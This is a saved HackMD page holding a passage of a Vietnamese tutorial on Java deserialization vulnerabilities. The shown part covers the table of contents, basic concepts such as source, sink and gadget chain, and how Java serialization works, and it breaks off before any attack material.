<!DOCTYPE html>
<!-- saved from url=(0037)https://hackmd.io/@nhat015/HktihBmLxl -->
<html lang="vi-VN" data-themeable="true" theme="dark"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black">
    <meta name="mobile-web-app-capable" content="yes">
    <meta name="csrf-token" content="RVqIdnor-gB6Tkxc8oEiiQxpxKJQcNQRWf14">
    
    
    <meta name="description" content=":bulb: Xuân Nhật">
    
    <title>Những điểu về lỗ hổng Java Deserialization vulnerability - HackMD</title>
    <link rel="icon" type="image/png" href="https://hackmd.io/favicon.png">
	<link rel="apple-touch-icon" href="https://hackmd.io/apple-touch-icon.png">
	<!--  meta value for server side given sign in boolean -->
    <meta name="signin" content="false">

    
<script type="text/javascript" crossorigin="anonymous" async="" src="./Những điểu về lỗ hổng Java Deserialization vulnerability - HackMD_files/array.js.tải xuống"></script><script async="" src="./Những điểu về lỗ hổng Java Deserialization vulnerability - HackMD_files/gtm.js.tải xuống"></script><script nonce="">
  window.domain = 'hackmd.io'
  window.urlpath = ''
  window.debug = false || window.localStorage.getItem('HMD_DEBUG_FLAG') === 'true'
  window.version = '1.3.0'
  window.brand = 'HackMD'

  
  window.NOTE_ID = 'hqnezBMcQuKUE6qHa51lZg'
  

  window.GOOGLE_DRIVE_API_KEY = 'AIzaSyAHmcP5gL_64ZafuAYOvJruFAIaYgHQaY4'
  window.GOOGLE_DRIVE_CLIENT_ID = '65857506266-76uhhee8se8dgs1i0q8fhtj1prg0ar27.apps.googleusercontent.com'
  window.DROPBOX_APP_KEY = 'rdoizrlnkuha23r'
  
  window.PLANTUML_SERVER = 'https://ptuml.hackmd.io'

  window.ASSET_URL = 'https://assets.hackmd.io'

  window.USER_CAN_CREATE_TEAM = true
  window.USER_CAN_DELETE_ACCOUNT = true
  window.USER_DELETE_ACCOUNT_VIA_EMAIL = true
  window.PAYMENT_ENABLED = true
  window.PAYMENT_PROMOTION_BANNER_ENABLED = false
  window.GITHUB_SYNC_ENABLED = true
  window.GITLAB_SYNC_ENABLED = false
  window.GITLAB_SYNC_BASE_URL = ''
  window.VCS_SYNC_MODE = 'github'
  window.VCS_PROVIDER_NAME = 'GitHub'
  window.FREE_TEAM_NUM = 20
  window.FREE_TEAM_MEMBER_NUM = 3
  window.FREE_PUBLIC_TEAM_NUM = 10
  window.NEO_OVERVIEW_UI = true
  window.NEO_PROFILE_UI = true

  
      window.FOLDER_ENABLE = true
  

  
  window.EE_SITE_ENABLE = false
  window.EE_SITE_NAME = 'false'
  window.EE_SITE_LINK = 'false'
  window.EESITE_INFO = false
  window.ENTERPRISE_DISCOVERY_ENABLE = false
  window.ENTERPRISE_DISCOVERY_TEAM = true
  window.ENTERPRISE_DISCOVERY_NOTE = true
  window.ENTERPRISE_DISCOVERY_VIEW_PERMISSION = 'guest'
  
  window.ALLOW_ANONYMOUS = true
  window.ALLOW_ANONYMOUS_EDIT = false
  window.ALLOW_DOWNLOAD_PDF = true
  window.PUBLIC_OVERVIEW = false
  window.INTERNAL_PUBLIC_OVERVIEW = false
  window.FULL_TEXT_SEARCH_ENABLE = false
  window.ALGOLIA_SEARCH_ENABLE = true
  window.MARKETING_EMAIL_ENABLE = true
  window.OFFLINE_ACCESS = true
  
  
  
    window.WALLET_CONNECT_PROJECT_ID = '91d6fa182b725b5895a17a170a5878c1'
  
  window.API_MANAGEMENT_UI_ENABLE = true
  window.FEEDBACK_UI_ENABLE = true
  window.PUBLISH_ENABLE = true

  

  
  window.SHOW_HOT_NOTES = false
  

  
  window.HOT_NOTES_TIME_TYPE = 'week'
  

  
  window.SHOW_OVERVIEW = false
  

  
  window.MENTIONS = {}
  

  
  window.MENTION_ANCHORS = []
  

  
  window.COMMENT_ANCHORS = []
  

  
  window.IS_OWNER = false
  

  
  window.IS_TEAM_ADMIN = false
  

  
  window.IS_TEAM_MEMBER = false
  

  
  window.IS_INVITEE_ADMIN = false
  

  
  window.USER_PROFILE = '%7B%22name%22%3A%22Guest%20May%22%7D'
  

  
  window.VERSION_TIME = '1756609552755'
  

  
  window.canEdit = false
  

  
  window.canWriteComment = false
  

  
  window.canHideComment = false
  

  window.TRASH_NOTE_DELETE_AFTER_FREE = 3
  window.TRASH_NOTE_DELETE_AFTER_PAID = 30

  
    window.ENABLED_PREVIEW_FEATURE = {}
  

  
    window.ACTIVE_PREVIEW_FEATURE = ["beta-slide-preview"]
  

  
    window.IS_OWNER_UPGRADED = false
  

  
    window.IMGUR_FALLBACK_CDN = 'https://imgur-backup.hackmd.io'
  

  
    window.CLOUD_META_UI = true
  
  
    window.CLOUD_META_API = true
  
  
    window.CLOUD_META_MIGRATION = false
  
  
    window.YAML_METADATA_ENABLED = false
  

  
    window.NOTE_CAPACITY_LIMIT = 50
  

  
    window.DOCUMENT_MAX_LENGTH = 100000
  

  
    window.SOCIAL_NETWORK_FEATURES_ENABLED = true
  

  
    window.PUBLISHMENT_MODERATION_ENABLED = true
  

  
    window.COMMENT_ENABLED = true
  

  
    window.COMMENT_PERMISSION = "signed_in_users"
  

  window.SUGGEST_EDIT_ENABLED = true
  
    window.SUGGEST_EDIT_ENABLED = true
  

  
    window.SUGGEST_EDIT_PERMISSION = "signed_in_users"
  
  
    window.canWriteSuggestEdit = false
  

  window.CITATION_ENABLED = true

  window.NOTE_FROM_COMMENT_ENABLED = true

  
    window.NOTE_FEATURES = {"emoji-reply":"signed_in_users","citation":"disabled"}
  

  
    window.REALTIME_CLIENT_WITH_CREDENTIALS = false
  

  
    window.DEBUG_DISCONNECT_SOCKET_WHEN_OFFLINE = false
  

  

  
    window.PREFERRED_UI_THEME = "dark"
  

  

  
    window.CUSTOM_STYLE_ENABLED = "true"
  

  
    window.USE_NEW_LOGO = true
  

  
    window.ITERABLE_ENABLED = true
  
  
    window.ITERABLE_API_KEY = "c2c36a44c2614fb19aa3b46d660bbce2"
  

  
    window.TEXT_SELECTION_CHANGED = false
  

  
    window.CAN_VIEW_HISTORY_AT_REVISION = false
  

  
    window.GUIDED_COMMENT_ENABLED = true
  

  
    window.ENCODED_SESSION_ID = "Wa8eRx9D8f9E0o+oQH3S71Szny7Db6ekmXrwq1RH+7w="
  
</script>


    
<!-- Google Tag Manager -->
<script nonce="">(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
})(window,document,'script','dataLayer','GTM-KLW9Z3');</script>
<!-- End Google Tag Manager -->


    






    <meta property="fb:app_id" content="1436904003272070">



    <meta name="robots" content="index, follow">



    <meta name="twitter:image:src" content="https://hackmd.io/images/media/HackMD-neo-og.jpg">
    <meta name="twitter:image:alt" content="Những điểu về lỗ hổng Java Deserialization vulnerability - HackMD">


<meta name="twitter:site" content="@hackmdio">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:title" content="Những điểu về lỗ hổng Java Deserialization vulnerability - HackMD">


    <meta name="twitter:description" content=":bulb: Xuân Nhật">



    <meta property="og:image" content="https://hackmd.io/images/media/HackMD-neo-og.jpg">
    <meta property="og:image:alt" content="Những điểu về lỗ hổng Java Deserialization vulnerability - HackMD">


<meta property="og:site_name" content="HackMD">
<meta property="og:type" content="article">
<meta property="og:title" content="Những điểu về lỗ hổng Java Deserialization vulnerability - HackMD">


    <meta property="og:description" content=":bulb: Xuân Nhật">



    <link rel="canonical" href="https://hackmd.io/@nhat015/HktihBmLxl">
    <meta property="og:url" content="https://hackmd.io/@nhat015/HktihBmLxl">
    <meta property="twitter:url" content="https://hackmd.io/@nhat015/HktihBmLxl">

    <link rel="alternate" type="text/markdown" href="https://hackmd.io/@nhat015/HktihBmLxl.md" title="Pure markdown version">
    <link rel="alternate" type="text/markdown" href="https://hackmd.io/@nhat015/HktihBmLxl.md?no-meta" title="Pure markdown version without metadata">


     <link href="./Những điểu về lỗ hổng Java Deserialization vulnerability - HackMD_files/font-vendor.ea8218d7d4f468b2c430.css" rel="stylesheet"><link href="./Những điểu về lỗ hổng Java Deserialization vulnerability - HackMD_files/common-vendor.fd34b1d1ad1390fa8864.css" rel="stylesheet"><link href="./Những điểu về lỗ hổng Java Deserialization vulnerability - HackMD_files/pretty-vendor.d39c3586ad724c4bdff1.css" rel="stylesheet"><link href="./Những điểu về lỗ hổng Java Deserialization vulnerability - HackMD_files/pretty.baf9e464abc4f290effd.css" rel="stylesheet">
    <!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
<!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
<!--[if lt IE 9]>
	<script src="https://cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7.3/html5shiv.min.js" integrity="sha256-3Jy/GbSLrg0o9y5Z5n1uw0qxZECH7C6OQpVBgNFYa0g=" crossorigin="anonymous"></script>
	<script src="https://cdnjs.cloudflare.com/ajax/libs/respond.js/1.4.2/respond.min.js" integrity="sha256-g6iAfvZp+nDQ2TdTR/VVKJf3bGro4ub5fvWSWVRi2NE=" crossorigin="anonymous"></script>
	<script src="https://cdnjs.cloudflare.com/ajax/libs/es5-shim/4.5.9/es5-shim.min.js" integrity="sha256-8E4Is26QH0bD52WoQpcB+R/tcWQtpzlCojrybUd7Mxo=" crossorigin="anonymous"></script>
<![endif]-->

    


    <script nonce="">
  window.__shouldIgnoreTracker = function() {
    const isDebug = window.debug === true
    const isLocal = /^localhost$|^127(\.[0-9]+){0,2}\.[0-9]+$|^\[::1?\]$|^local\.localhost$/.test(location.hostname) || location.protocol === 'file:'
    const isAutomation = Boolean(window._phantom || window.__nightmare || window.navigator.webdriver || window.Cypress)
    return isDebug || isLocal || isAutomation
  }
</script>

<!-- plausible -->
<script defer="" data-domain="hackmd.io" src="./Những điểu về lỗ hổng Java Deserialization vulnerability - HackMD_files/script.js.tải xuống"></script>
<script nonce="">
  window.plausible = window.plausible || function() { (window.plausible.q = window.plausible.q || []).push(arguments); }
  const keyboardWhiteList = ['a', 'span', 'button']

  function getTaggedEventAttributes (e) {
    const eventAttrs = { name: null, props: {} }
    if (!e || !e.classList) return eventAttrs
    const psEvent = /plausible-event-(.+)(=|--)(.+)/
    for (const className of [...e.classList]) {
      const [, key, , val] = className.match(psEvent) || []
      if (!key || !val) continue
      const value = val.replace(/\+/g, ' ')
      switch (key.toLowerCase()) {
        case 'name':
          eventAttrs.name = value
          break
        default:
          eventAttrs.props[key] = value
          break
      }
    }
    return eventAttrs
  }

  function shouldIgnore () {
    return window.__shouldIgnoreTracker() || window.localStorage.getItem('plausible_ignore') === 'true'
  }

  function handler (e) {
    if (!window.plausible) return
    if (!e.target || !('className' in e.target)) return
    const ele = e.target

    const eventAttrs = getTaggedEventAttributes(ele)
    if (!eventAttrs.name) return
    if (ele?.href) eventAttrs.props.url = ele.href

    if (shouldIgnore()) {
      if (window.debug) logDebugEventMsg(eventAttrs)
      return
    }
    window.plausible(eventAttrs.name, { props: eventAttrs.props })
  }

  function logDebugEventMsg (eventAttrs) {
    console.warn(
      `Ignoring Event: "${eventAttrs.name}"`,
      eventAttrs,
    )
  }

  function keydownHandler (e) {
    if (e.key !== 'Enter') return
    if (e.target.nodeName.toLowerCase() === 'input') {
      switch (e.target.type.toLowerCase()) {
        case 'submit':
        case 'button':
        case 'reset':
        case 'checkbox':
        case 'radio':
        case 'file':
        case 'image':
        case 'color':
          break
        default:
          return
      }
    } else if (!keyboardWhiteList.includes(e.target.nodeName.toLowerCase())) {
      return
    }
    handler(e)
  }

  document.addEventListener('mousedown', handler)
  document.addEventListener('keydown', keydownHandler)
</script>

    
<script nonce="">
  window.publishProps = JSON.parse(`{"isOwnerAnonymous":false,"isOwnedByTeam":false,"ownerInfo":{"name":"ASEN","path":"nhat015","avatarUrl":"data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiIHN0YW5kYWxvbmU9Im5vIj8%2BPHN2ZyB4bWxuczpyZGY9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkvMDIvMjItcmRmLXN5bnRheC1ucyMiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgaGVpZ2h0PSI5NiIgd2lkdGg9Ijk2IiB2ZXJzaW9uPSIxLjEiIHZpZXdCb3g9IjAgMCA5NiA5NiI%2BPGc%2BPHJlY3Qgd2lkdGg9Ijk2IiBoZWlnaHQ9Ijk2IiBmaWxsPSIjYzYzZjU2IiAvPjx0ZXh0IGZvbnQtc2l6ZT0iNjRweCIgZm9udC1mYW1pbHk9InNhbnMtc2VyaWYiIHRleHQtYW5jaG9yPSJtaWRkbGUiIGZpbGw9IiNmZmZmZmYiPjx0c3BhbiB4PSI0OCIgeT0iNzIiIHN0cm9rZS13aWR0aD0iLjI2NDU4cHgiIGZpbGw9IiNmZmZmZmYiPkE8L3RzcGFuPjwvdGV4dD48L2c%2BPC9zdmc%2B","description":"Student%2C%20Web%20player"},"isPublished":true,"createTime":1752550560574,"updateTime":1756609552755,"vcsSyncMode":"github","vcsProviderName":"GitHub","canEdit":false,"hardBreaks":true,"onlyOwnerCanEdit":true,"isCommentEnabled":true,"likedCount":0,"isNotificationEnabled":true,"notificationType":"never","hasEmail":false,"canWriteComment":false,"viewCount":576,"markdown":"!%5B499875939_2193800777758116_7654641646010743849_n%5D(https%3A%2F%2Fhackmd.io%2F_uploads%2FS1X8pHXUel.jpg)%0A%23%20Nh%E1%BB%AFng%20%C4%91i%E1%BB%83u%20v%E1%BB%81%20l%E1%BB%97%20h%E1%BB%95ng%20Java%20Deserialization%20vulnerability%0A**Tr%C6%B0%C6%A1ng%20Xu%C3%A2n%20Nh%E1%BA%ADt**%0A%23%23%20M%E1%BB%A5c%20l%E1%BB%A5c%0AI.%20L%C3%9D%20THUY%E1%BA%BET%0A1.%20M%E1%BB%99t%20s%E1%BB%91%20kh%C3%A1i%20ni%E1%BB%87m%20c%C6%A1%20b%E1%BA%A3n%0A2.%20Ki%E1%BA%BFn%20th%E1%BB%A9c%20n%E1%BB%81n%0A%20%20%20%202.1%20Serialization%0A%20%20%20%202.2%20Deserialization%0A%20%20%20%202.3%20Qu%C3%A1%20tr%C3%ACnh%20de%2Fserialization%20trong%20java%20th%E1%BB%B1c%20s%E1%BB%B1%20di%E1%BB%85n%20ra%20nh%C6%B0%20th%E1%BA%BF%20n%C3%A0o%3F%0A%20%20%20%202.4%20Serialize%20data%0A%20%20%20%202.5%20Java%20magic%20method%0A3.%20Insecure%20Deserialization%20l%C3%A0%20g%C3%AC%0A4.%20L%C3%BD%20do%20l%E1%BB%97%20h%E1%BB%95ng%20Insecure%20Deserialization%20ph%C3%A1t%20sinh%3F%0A5.%20H%E1%BA%ADu%20qu%E1%BA%A3%20c%E1%BB%A7a%20Insecure%20Deserialization%0A6.%20Gadget%20chain%20l%C3%A0%20g%C3%AC%3F%0A7.%20Java%20Reflection%0A8.%20SerializationDumper%0A9.%20Gi%E1%BB%9Bi%20thi%E1%BB%87u%20v%E1%BB%81%20Ysoserial%0A10.%20C%C3%B4ng%20c%E1%BB%A5%20Gadget%20Inspector%0A11.%20C%C3%A1ch%20ng%C4%83n%20ch%E1%BA%B7n%20Java%20Deserialization%20vulnerability%0A%20%0AII.%20D%E1%BB%B0NG%20M%C3%94I%20TR%C6%AF%E1%BB%9CNG%20TEST%0A%0A---%0A%0A%23%23%20I.%20L%C3%9D%20THUY%E1%BA%BET%0A%23%23%23%201.%20M%E1%BB%99t%20s%E1%BB%91%20kh%C3%A1i%20ni%E1%BB%87m%20c%C6%A1%20b%E1%BA%A3n%0AD%C6%B0%E1%BB%9Bi%20%C4%91%C3%A2y%20l%C3%A0%20m%E1%BB%99t%20s%E1%BB%91%20kh%C3%A1i%20ni%E1%BB%87m%20m%C3%ACnh%20s%E1%BA%BD%20n%C3%AAu%20ra%20tr%C6%B0%E1%BB%9Bc%20khi%20v%C3%A0o%20b%C3%A0i%3A%0A*%20**Source**%3A%20L%C3%A0%20%C4%91i%E1%BB%83m%20b%E1%BA%AFt%20%C4%91%E1%BA%A7u%20c%E1%BB%A7a%20gadgetchain.%20Khi%20deser%2C%20java%20s%E1%BA%BD%20g%E1%BB%8Di%20method%20readObject()%20c%E1%BB%A7a%20source%20Object.%0A*%20**Sink**%3A%20L%C3%A0%20%C4%91i%E1%BB%83m%20cu%E1%BB%91i%20c%E1%BB%A7a%20gadgetchain.%20L%C3%A0%20n%C6%A1i%20%C4%91%E1%BA%BFn%20c%C3%A1c%20method%20h%E1%BB%AFu%20%C3%ADch%20m%C3%A0%20m%C3%ACnh%20mong%20mu%E1%BB%91n%20%C4%91%E1%BB%83%20c%C3%B3%20th%E1%BB%83%20RCE%2C%20writefile%2C...%0A*%20**Reflection%20in%20java**%3A%20%C4%90%C3%A2y%20l%C3%A0%20m%E1%BB%99t%20api%20c%E1%BB%A7a%20java%20cho%20ph%C3%A9p%20truy%20c%E1%BA%ADp%20c%C3%A1c%20th%C3%B4ng%20tin%20c%E1%BB%A7a%20%C4%91%E1%BB%91i%20t%C6%B0%E1%BB%A3ng(t%C3%AAn%20class%2C%20c%C3%A1c%20field%2C%20c%C3%A1c%20method)%20v%C3%A0%20ch%E1%BB%89nh%20s%E1%BB%ADa%20c%C3%A1c%20field%20%C4%91%E1%BB%91i%20t%C6%B0%E1%BB%A3ng(k%E1%BB%83%20c%E1%BA%A3%20c%C3%A1c%20field%20private)%20trong%20qu%C3%A1%20tr%C3%ACnh%20runtime.%20(for%20more%20detail%3A%5BReflection%20in%20Java%5D(https%3A%2F%2Fwww.geeksforgeeks.org%2Fjava%2Freflection-in-java%2F)%2C%20%20%5Btsublogs%5D(https%3A%2F%2Ftsublogs.wordpress.com%2F2023%2F02%2F15%2Fjavasecurity101-1-java-reflection%2F)%2C%20%5Boracle%5D(https%3A%2F%2Fwww.oracle.com%2Ftechnical-resources%2Farticles%2Fjava%2Fjavareflection.html)%2C%20%5BField%5D(https%3A%2F%2Fdocs.oracle.com%2Fjavase%2F8%2Fdocs%2Fapi%2Fjava%2Flang%2Freflect%2FField.html)%2C%20%5BObject%5D(https%3A%2F%2Fdocs.oracle.com%2Fjavase%2F8%2Fdocs%2Fapi%2Fjava%2Flang%2FObject.html)%2C%20%5BClass%5D(https%3A%2F%2Fdocs.oracle.com%2Fjavase%2F8%2Fdocs%2Fapi%2Fjava%2Flang%2FClass.html)%0A*%20**Method%20call**%3A%20method%20A%20g%E1%BB%8Di%20method%20B%2C%20method%20A%20-%3E%20method%20B%0A*%20**Gadgetchain**%3A%20l%C3%A0%20lu%E1%BB%93ng%20th%E1%BB%B1c%20thi%2C%20l%C3%A0%20k%E1%BA%BFt%20qu%E1%BA%A3%20khi%20ta%20gh%C3%A9p%20c%C3%A1c%20method%20call%2C%20c%C3%A1c%20field%20l%E1%BA%A1i%20v%E1%BB%9Bi%20nhau%20t%E1%BB%AB%20source%20%C4%91%E1%BA%BFn%20sink%2C%20t%E1%BA%A1o%20ra%20%C4%91%C6%B0%E1%BB%A3c%20lu%E1%BB%93ng%20th%E1%BB%B1c%20thi%20m%C3%A0%20m%C3%ACnh%20mong%20mu%E1%BB%91n.(for%20more%20detail%3A%5BGadget%20chains%5D(https%3A%2F%2Fportswigger.net%2Fweb-security%2Fdeserialization%2Fexploiting%23gadget-chains))%0A%0A%23%23%23%202.%20Ki%E1%BA%BFn%20th%E1%BB%A9c%20n%E1%BB%81n%0ASau%20khi%20bi%E1%BA%BFt%20m%E1%BB%99t%20s%E1%BB%91%20kh%C3%A1i%20ni%E1%BB%87m%20c%C6%A1%20b%E1%BA%A3n%20v%C3%A0%20mu%E1%BB%91n%20%C4%91i%20ti%E1%BA%BFp%20ch%E1%BB%A7%20%C4%91%E1%BB%81%20n%C3%A0y%2C%20ch%C3%BAng%20ta%20quay%20l%E1%BA%A1i%20v%C3%A0%20t%C3%ACm%20hi%E1%BB%83u%20kh%C3%A1i%20ni%E1%BB%87m%20v%E1%BB%81%20**Serialization%2FDeserialization**%20trong%20java%20v%C3%A0%20t%E1%BA%A1i%20sao%20n%C3%B3%20l%E1%BA%A1i%20c%E1%BA%A7n%20thi%E1%BA%BFt.%0A%23%23%23%23%202.1%20Serialization%0A!%5Bh%C3%A0m%20serialize%20trong%20java%5D(https%3A%2F%2Fhackmd.io%2F_uploads%2FHkIpMWLIeg.png)%0A%23%23%23%23%23%20Kh%C3%A1i%20ni%E1%BB%87m%0ASerialization%20l%C3%A0%20c%C6%A1%20ch%E1%BA%BF%20chuy%E1%BB%83n%20%C4%91%E1%BB%95i%20c%E1%BA%A5u%20tr%C3%BAc%20d%E1%BB%AF%20li%E1%BB%87u%20(data%20structure)%20ho%E1%BA%B7c%20tr%E1%BA%A1ng%20th%C3%A1i%20c%E1%BB%A7a%20object%20(object%20states)%20tr%E1%BB%9F%20th%C3%A0nh%20lu%E1%BB%93ng%20byte%20(byte%20streams)%2C%20byte%20streams%20c%C3%B3%20th%E1%BB%83%20%C4%91%C6%B0%E1%BB%A3c%20l%C6%B0u%20v%C3%A0o%20file%2C%20b%E1%BB%99%20nh%E1%BB%9B%20%C4%91%E1%BB%87m%20(memory%20buffering)%2C%20database%20ho%E1%BA%B7c%20truy%E1%BB%81n%20%C4%91i%20qua%20network.%20M%E1%BA%A3ng%20byte%20n%C3%A0y%20%C4%91%E1%BA%A1i%20di%E1%BB%87n%20cho%20class%20c%E1%BB%A7a%20object%2C%20phi%C3%AAn%20b%E1%BA%A3n%20c%E1%BB%A7a%20object%2C%20v%C3%A0%20tr%E1%BA%A1ng%20th%C3%A1i%20c%E1%BB%A7a%20object.%0A!%5B1628497417-103268%5D(https%3A%2F%2Fhackmd.io%2F_uploads%2FrJz10DmUeg.png)%0ATham%20kh%E1%BA%A3o%3A%5Bgeeksforgeeks%5D(https%3A%2F%2Fwww.geeksforgeeks.org%2Fjava%2Fserialization-and-deserialization-in-java%2F)%2C%20%5Boracle%5D(https%3A%2F%2Fdocs.oracle.com%2Fjavase%2F8%2Fdocs%2Fapi%2Fjava%2Fio%2FSerializable.html)%2C%5BJava%20Serialization%5D(https%3A%2F%2Fwww.baeldung.com%2Fjava-serialization)%0A%23%23%23%23%23%20%C4%90%E1%BA%B7c%20%C4%91i%E1%BB%83m%20c%E1%BB%A7a%20Serialization%0A*%20Ch%E1%BB%89%20c%C3%A1c%20object%20c%E1%BB%A7a%20c%C3%A1c%20class%20%C4%91%C6%B0%E1%BB%A3c%20implements%20t%E1%BB%AB%20interface%20Serializable%20m%E1%BB%9Bi%20c%C3%B3%20th%E1%BB%83%20%C4%91%C6%B0%E1%BB%A3c%20%C4%91%C6%B0a%20v%C3%A0o%20qu%C3%A1%20tr%C3%ACnh%20Serialization.%20Nh%C6%B0ng%20n%E1%BA%BFu%20superclass%20l%C3%A0%20Serializable%20th%C3%AC%20c%C3%A1c%20l%E1%BB%9Bp%20con%20c%E1%BB%A7a%20n%C3%B3%20c%C3%B3%20th%E1%BB%83%20%C4%91%C6%B0a%20v%C3%A0o%20qu%C3%A1%20tr%C3%ACnh%20Serialization.%0A*%20Khi%20serialize%20b%E1%BA%A5t%20k%E1%BB%B3%20object%20n%C3%A0o%20m%C3%A0%20n%C3%B3%20c%C3%B3%20ch%E1%BB%A9a%20tham%20chi%E1%BA%BFu%20%C4%91%E1%BA%BFn%20object%20kh%C3%A1c%20th%C3%AC%20Java%20serialization%20s%E1%BA%BD%20serialize%20lu%C3%B4n%20c%E1%BA%A3%20object%20%C4%91%C3%B3%20(n%E1%BA%BFu%20object%20%C4%91%C6%B0%E1%BB%A3c%20tham%20chi%E1%BA%BFu%20kh%C3%B4ng%20implement%20the%20java.io.Serializable%20interface%20th%C3%AC%20java.io.NotSerializableException%20s%E1%BA%BD%20x%E1%BA%A3y%20ra%0A*%20B%C3%AAn%20trong%20class%2C%20c%C3%A1c%20d%E1%BB%AF%20li%E1%BB%87u%20c%C3%B3%20non-access%20modifier%20l%C3%A0%20static%20v%C3%A0%20transient%20s%E1%BA%BD%20kh%C3%B4ng%20%C4%91%C6%B0%E1%BB%A3c%20l%C6%B0u%20v%C3%A0o%20object%20states%20khi%20serialize.%0A%0A%23%23%23%23%23%20L%C3%BD%20do%20c%E1%BA%A7n%20Serialization%0ASerialization%20trong%20Java%20l%C3%A0%20m%E1%BB%99t%20c%C6%A1%20ch%E1%BA%BF%20quan%20tr%E1%BB%8Dng%20gi%C3%BAp%20chuy%E1%BB%83n%20%C4%91%E1%BB%95i%20%C4%91%E1%BB%91i%20t%C6%B0%E1%BB%A3ng%20(object)%20th%C3%A0nh%20chu%E1%BB%97i%20byte%2C%20cho%20ph%C3%A9p%20l%C6%B0u%20tr%E1%BB%AF%20v%C3%A0%20truy%E1%BB%81n%20t%E1%BA%A3i%20d%E1%BB%AF%20li%E1%BB%87u%20m%E1%BB%99t%20c%C3%A1ch%20hi%E1%BB%87u%20qu%E1%BA%A3.%20Khi%20m%E1%BB%99t%20ch%C6%B0%C6%A1ng%20tr%C3%ACnh%20Java%20c%E1%BA%A7n%20ghi%20l%E1%BA%A1i%20tr%E1%BA%A1ng%20th%C3%A1i%20c%E1%BB%A7a%20%C4%91%E1%BB%91i%20t%C6%B0%E1%BB%A3ng%20%C4%91%E1%BB%83%20s%E1%BB%AD%20d%E1%BB%A5ng%20sau%20n%C3%A0y%20%E2%80%94%20ch%E1%BA%B3ng%20h%E1%BA%A1n%20nh%C6%B0%20l%C6%B0u%20v%C3%A0o%20file%2C%20c%C6%A1%20s%E1%BB%9F%20d%E1%BB%AF%20li%E1%BB%87u%2C%20ho%E1%BA%B7c%20g%E1%BB%ADi%20qua%20m%E1%BA%A1ng%20%E2%80%94%20qu%C3%A1%20tr%C3%ACnh%20serialization%20s%E1%BA%BD%20%C4%91%E1%BA%A3m%20nh%E1%BA%ADn%20vi%E1%BB%87c%20m%C3%A3%20h%C3%B3a%20to%C3%A0n%20b%E1%BB%99%20th%C3%B4ng%20tin%20c%E1%BB%A7a%20%C4%91%E1%BB%91i%20t%C6%B0%E1%BB%A3ng%20%C4%91%C3%B3%20th%C3%A0nh%20m%E1%BB%99t%20%C4%91%E1%BB%8Bnh%20d%E1%BA%A1ng%20tu%E1%BA%A7n%20t%E1%BB%B1.%20Qu%C3%A1%20tr%C3%ACnh%20ng%C6%B0%E1%BB%A3c%20l%E1%BA%A1i%2C%20%C4%91%C6%B0%E1%BB%A3c%20g%E1%BB%8Di%20l%C3%A0%20deserialization%2C%20s%E1%BA%BD%20ph%E1%BB%A5c%20h%E1%BB%93i%20l%E1%BA%A1i%20%C4%91%E1%BB%91i%20t%C6%B0%E1%BB%A3ng%20t%E1%BB%AB%20chu%E1%BB%97i%20byte%20%C4%91%C3%A3%20l%C6%B0u.%0A%0AC%C6%A1%20ch%E1%BA%BF%20n%C3%A0y%20%C4%91%E1%BA%B7c%20bi%E1%BB%87t%20c%E1%BA%A7n%20thi%E1%BA%BFt%20trong%20c%C3%A1c%20%E1%BB%A9ng%20d%E1%BB%A5ng%20ph%C3%A2n%20t%C3%A1n%20(distributed%20systems)%2C%20n%C6%A1i%20m%C3%A0%20c%C3%A1c%20%C4%91%E1%BB%91i%20t%C6%B0%E1%BB%A3ng%20c%E1%BA%A7n%20%C4%91%C6%B0%E1%BB%A3c%20truy%E1%BB%81n%20gi%E1%BB%AFa%20client%20v%C3%A0%20server%20th%C3%B4ng%20qua%20socket%20ho%E1%BA%B7c%20giao%20th%E1%BB%A9c%20HTTP.%20Ngo%C3%A0i%20ra%2C%20trong%20c%C3%A1c%20c%C3%B4ng%20ngh%E1%BB%87%20nh%C6%B0%20Java%20RMI%20(Remote%20Method%20Invocation)%20ho%E1%BA%B7c%20h%E1%BB%87%20th%E1%BB%91ng%20message%20queue%20nh%C6%B0%20JMS%2C%20serialization%20l%C3%A0%20n%E1%BB%81n%20t%E1%BA%A3ng%20cho%20vi%E1%BB%87c%20chia%20s%E1%BA%BB%20v%C3%A0%20x%E1%BB%AD%20l%C3%BD%20d%E1%BB%AF%20li%E1%BB%87u%20qua%20nhi%E1%BB%81u%20th%C3%A0nh%20ph%E1%BA%A7n%20h%E1%BB%87%20th%E1%BB%91ng.%20Nh%E1%BB%9D%20%C4%91%C3%B3%2C%20serialization%20gi%C3%BAp%20%C4%91%E1%BA%A3m%20b%E1%BA%A3o%20t%C3%ADnh%20t%C6%B0%C6%A1ng%20t%C3%A1c%2C%20t%C3%ADnh%20di%20%C4%91%E1%BB%99ng%20v%C3%A0%20s%E1%BB%B1%20b%E1%BB%81n%20v%E1%BB%AFng%20c%E1%BB%A7a%20d%E1%BB%AF%20li%E1%BB%87u%20trong%20c%C3%A1c%20%E1%BB%A9ng%20d%E1%BB%A5ng%20Java%20hi%E1%BB%87n%20%C4%91%E1%BA%A1i.%0AM%E1%BB%99t%20s%E1%BB%91%20t%C3%A1c%20d%E1%BB%A5ng%20ch%C3%ADnh%20c%E1%BB%A7a%20Serialization%20bao%20g%E1%BB%93m%3A%0A*%20Truy%E1%BB%81n%20d%E1%BB%AF%20li%E1%BB%87u%20qua%20m%E1%BA%A1ng%3A%0ASerialization%20cho%20ph%C3%A9p%20c%C3%A1c%20%C4%91%E1%BB%91i%20t%C6%B0%E1%BB%A3ng%20Java%20%C4%91%C6%B0%E1%BB%A3c%20chuy%E1%BB%83n%20%C4%91%E1%BB%95i%20th%